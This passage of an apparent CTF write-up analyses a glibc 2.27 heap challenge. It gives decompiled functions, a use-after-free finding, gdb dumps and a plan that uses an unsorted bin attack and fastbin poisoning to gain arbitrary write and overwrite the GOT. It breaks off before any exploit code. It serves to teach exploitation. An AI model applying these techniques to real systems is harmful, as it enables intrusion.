+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">destroy_robot</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_15 [<span style="color:#f60">5</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Provide robot</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s slot:&#34;</span>);
+</span></span><span style="display:flex;"><span>  read(<span style="color:#f60">0</span>,local_15,<span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#555">=</span> atoi(local_15);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>) <span style="color:#555">||</span> (<span style="color:#f60">4</span> <span style="color:#555">&lt;</span> iVar1)) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Slot is empty!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(check_robot_slot <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">==</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;robot doesn</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">t exist!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> {
+</span></span><span style="display:flex;"><span>    free(<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(robots <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">8</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#555">*</span>(undefined4 <span style="color:#555">*</span>)(check_robot_slot <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">4</span>) <span style="color:#555">=</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>    number_robots <span style="color:#555">=</span> number_robots <span style="color:#555">+</span> <span style="color:#555">-</span><span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that this destroys robot only nullify the <code>check_robot_slot</code> flag, but doesn&rsquo;t null the <code>robots</code> pointer. This might be a bug.</p>
+<p><strong>program_robot</strong></p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">program_robot</span>(<span style="color:#078;font-weight:bold">void</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">char</span> local_15 [<span style="color:#f60">5</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> local_10;
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>);
+</span></span><span style="display:flex;"><span>  puts(<span style="color:#c30">&#34;Provide robot</span><span style="color:#c30;font-weight:bold">\&#39;</span><span style="color:#c30">s slot:&#34;</span>);
+</span></span><span style="display:flex;"><span>  read(<span style="color:#f60">0</span>,local_15,<span style="color:#f60">4</span>);
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#555">=</span> atoi(local_15);
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> ((iVar1 <span style="color:#555">&lt;</span> <span style="color:#f60">0</span>) <span style="color:#555">||</span> (<span style="color:#f60">4</span> <span style="color:#555">&lt;</span> iVar1)) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Slot is empty!&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">else</span> <span style="color:#069;font-weight:bold">if</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(robots <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>    puts(<span style="color:#c30">&#34;Program the robot:&#34;</span>);
+</span></span><span style="display:flex;"><span>    read(<span style="color:#f60">0</span>,<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">**</span>)(robots <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">8</span>),(<span style="color:#078;font-weight:bold">long</span>)<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">int</span> <span style="color:#555">*</span>)(robot_memory_size <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)iVar1 <span style="color:#555">*</span> <span style="color:#f60">4</span>))
+</span></span><span style="display:flex;"><span>    ;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">if</span> (local_10 <span style="color:#555">!=</span> <span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>)) {
+</span></span><span style="display:flex;"><span>                    <span style="color:#09f;font-style:italic">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>    __stack_chk_fail();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This is the <code>edit</code> function, where we can set the data of our allocated chunk. Notice that instead of using <code>check_robot_slot</code>, it still refers to the <code>robots</code> array to check whether a <code>robot</code> is freed or not.</p>
+<p>That means, even though we free the <code>robot</code> chunk, we can still edit it. This is a <code>Use-After-Free</code> bug.</p>
+<p>So, that&rsquo;s all the methods that can we use. Notice that there isn&rsquo;t any print or view method, which means by default, we can&rsquo;t leak anything. This will make the exploitation harder.</p>
+<h3 id="exploitation-plan">Exploitation Plan <a href="#exploitation-plan" class="anchor">#</a></h3>
+<p>Now that we&rsquo;ve known that there is a UAF bug, let&rsquo;s summarize our findings so far:</p>
+<ul>
+<li>GLIBC version is <code>2.27</code>
+<ul>
+<li>That means there is <code>tcache</code> bin, and every time we free a chunk with size &lt; <code>0x401</code>, it will go to tcache bin first until it fulls</li>
+<li>When the <code>tcache</code> bin is full, based on its size, it will go to either <code>unsortedbin</code> or <code>fastbin</code>. By default, if the <code>size</code> is larger than <code>0x80</code>, it will go to <code>unsortedbin</code>. Else, it will go to <code>fastbin</code>.</li>
+</ul>
+</li>
+<li>It uses <code>calloc</code> instead of <code>malloc</code>
+<ul>
+<li>What makes it differs is that <code>calloc</code> doesn&rsquo;t use <code>tcache</code> bin at all. But, it can use <code>fastbin</code> or <code>unsortedbin</code>.</li>
+<li>So, if we <code>free</code> a chunk and it goes to <code>tcache</code>, if we call <code>calloc</code> again with the same freed size, it won&rsquo;t use the tcache. Instead, it will create a new chunk.</li>
+</ul>
+</li>
+<li>No PIE and Partial Relro, which means we can overwrite GOT easily as the address is fixed (Only if we can create arbitrary write primitive).</li>
+<li>There is a UAF bug in the program, which allow us to edit <code>freed</code> chunk.</li>
+<li>The minimum allocation is <code>0x101</code>, which means it will go to either <code>tcache</code> or <code>unsortedbin</code>.</li>
+</ul>
+<p>Based on that summary, let&rsquo;s try to think about how should we attack this binary. After reading a lot of resources on the internet and thinking for a while, I found a working plan that could work. First, let&rsquo;s examine the global variable structure (To find the address, you can use gdb <code>vmmap</code> command to find the <code>rw</code> area of the binary)</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/38gx 0x00000000404000
+</span></span><span style="display:flex;"><span>0x404000:	0x0000000000403e20	0x00007ffff7ffe170
+</span></span><span style="display:flex;"><span>0x404010:	0x00007ffff7dea8f0	0x0000000000401030
+</span></span><span style="display:flex;"><span>0x404020 &lt;puts@got.plt&gt;:	0x00007ffff7a62970	0x00007ffff7af20f0
+</span></span><span style="display:flex;"><span>0x404030 &lt;__stack_chk_fail@got.plt&gt;:	0x0000000000401060	0x0000000000401070
+</span></span><span style="display:flex;"><span>0x404040 &lt;read@got.plt&gt;:	0x00007ffff7af2020	0x0000000000401090
+</span></span><span style="display:flex;"><span>0x404050 &lt;setvbuf@got.plt&gt;:	0x00007ffff7a632a0	0x00000000004010b0
+</span></span><span style="display:flex;"><span>0x404060:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404070:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404080 &lt;stdout@@GLIBC_2.2.5&gt;:	0x00007ffff7dce760	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404090 &lt;stdin@@GLIBC_2.2.5&gt;:	0x00007ffff7dcda00	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040a0 &lt;stderr@@GLIBC_2.2.5&gt;:	0x00007ffff7dce680	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040b0:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040c0 &lt;robot_memory_size&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040d0 &lt;robot_memory_size+16&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040e0 &lt;check_robot_slot&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x4040f0 &lt;check_robot_slot+16&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404100 &lt;robots&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404110 &lt;robots+16&gt;:	0x0000000000000000	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x404120 &lt;robots+32&gt;:	0x0000000000000000	0x0000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that the <code>robots</code> array is located at a higher address. If we&rsquo;re somehow able to forge our good-sized chunk location so that it points to the area of <code>robot_memory_size</code> or <code>check_robot_slot</code>, we will be able to create an arbitrary write primitive, because if we call <code>program_robot</code> on that chunk, it will be able to edit <code>robots</code> array as well, where we can simply fill one of the elements with the target address that we want to overwrite, and then use <code>program_robot</code> again on the overwritten index to do arbitrary write.</p>
+<p>Also because it is <code>No PIE</code>, the address is fixed, so we don&rsquo;t need a leak. Now moving to the next question, how can we forge a chunk so that it points to the global variable area?</p>
+<p>Remember that <code>calloc</code> doesn&rsquo;t use tcache at all so that we can&rsquo;t poison tcache pointers. We left with forging the metadata of <code>fastbin</code> chunk, but due to the limitation where we can only allocate chunk with size larger than <code>0x101</code>, we can&rsquo;t free chunk to the <code>fastbin</code> (It will go to <code>unsortedbin</code>).</p>
+<p>After reading resources, turn out <code>fastbin</code> has a variable called <code>global_max_fast</code>, which stored the maximum size of a chunk that can be freed to <code>fastbin</code>. So, we need a way to change this value, so that if we free chunk with size larger than <code>0x80</code> (the default value stored), it will go to <code>fastbin</code>.</p>
+<p>The trick here is to perform <code>unsorted bin attack</code>. You can find this attack in <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.27/unsorted_bin_attack.c" target="_blank" rel="noopener">how2heap</a> repo and this <a href="https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/" target="_blank" rel="noopener">blog</a>.</p>
+<p>To give more explanation, let&rsquo;s check on the gdb first to see the structure of the unsorted bin chunk. You can just try to allocate a big chunk, and then free it in the binary.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/4gx 0x405260-0x10
+</span></span><span style="display:flex;"><span>0x405250:	0x0000000000000000	0x0000000000002331
+</span></span><span style="display:flex;"><span>0x405260:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
+</span></span><span style="display:flex;"><span>gef➤  x/4gx 0x00007ffff7dcdca0
+</span></span><span style="display:flex;"><span>0x7ffff7dcdca0 &lt;main_arena+96&gt;:	0x00000000004076c0	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7ffff7dcdcb0 &lt;main_arena+112&gt;:	0x0000000000405250	0x0000000000405250
+</span></span><span style="display:flex;"><span>gef➤  x/gx &amp;global_max_fast
+</span></span><span style="display:flex;"><span>0x7ffff7dcf940 &lt;global_max_fast&gt;:	0x0000000000000080
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that the unsorted bin chunk stored a pointer to the <code>main_arena+96</code>, and it is near the <code>global_max_fast</code>. Let&rsquo;s try to <code>calloc</code> the chunk again, and see what happens to the stored pointer value.</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef➤  x/4gx 0x00007ffff7dcdca0
+</span></span><span style="display:flex;"><span>0x7ffff7dcdca0 &lt;main_arena+96&gt;:	0x00000000004076c0	0x0000000000000000
+</span></span><span style="display:flex;"><span>0x7ffff7dcdcb0 &lt;main_arena+112&gt;:	0x00007ffff7dcdca0	0x00007ffff7dcdca0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Notice that the <code>main_arena+112</code> value is changed! So, if we&rsquo;re able to overwrite the stored pointer of the unsorted bin chunk to <code>global_max_fast-0x10</code>, then we allocate the chunk again, we will be able to overwrite <code>global_max_fast</code> value to a huge value so that whenever we freed a chunk after the <code>tcache</code> bin is full, it will go to <code>fastbin</code> (Because the max size is no longer <code>0x80</code>).</p>
+<p>An important note is that, after we do this, the unsortedbin will be corrupted, so we need to ensure that all <code>calloc</code> after this point will use the cached chunks stored in the <code>fastbin</code>. We will discuss this more later.</p>
+<p>Now that we found a way to manipulate the fastbin max size, we can move to how to use this in our plan. As you remember, <code>calloc</code> never use <code>tcache</code> bin, so it is very easy to make the tcache full, we just need to <code>create</code> and <code>free</code> it repeatedly. And after it&rsquo;s full, when we freed a chunk, it will go to <code>fastbin</code>, and <code>calloc</code> is now able to use cached chunk.</p>
+<p>Now, remember that we have UAF bug where we can edit <code>robot</code> after it is freed. That means if we&rsquo;re able to free some <code>robots</code> to the fastbin, we can simply overwrite the fastbin linked list pointer so that it points to our targeted address. And then after <code>calloc</code>, we will get our arbitrary write primitive that we covered before.</p>
+<p>To summarize the rough plan:</p>
+<ul>
+<li>Do unsorted bin attack to overwrite <code>global_max_fast</code></li>
+<li>Now, freed some chunks to the <code>fastbin</code></li>
+<li>With UAF, overwrite the chunks stored pointer to our targeted address.</li>
+<li>Allocate it</li>
+<li>And now, we got a <code>robot</code> which stores a pointer that points to our targeted address, and we can tamper its data (For example, we can use this to overwrite the GOT table).</li>
+</ul>
+<p>Remember that we still don&rsquo;t have a leak up to this point. Because of it, my solution required us to do some brute forcing. The detailed explanation will come in the detailed solution</p>
+<h3 id="detailed-solution">Detailed Solution <a href="#detailed-solution" class="anchor">#</a></h3>
+<p>Now, based on those rough plans, let&rsquo;s try to do detailed steps on how will we exploit this. To make our life easier, let&rsquo;s try to create a helper first</p>
+<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
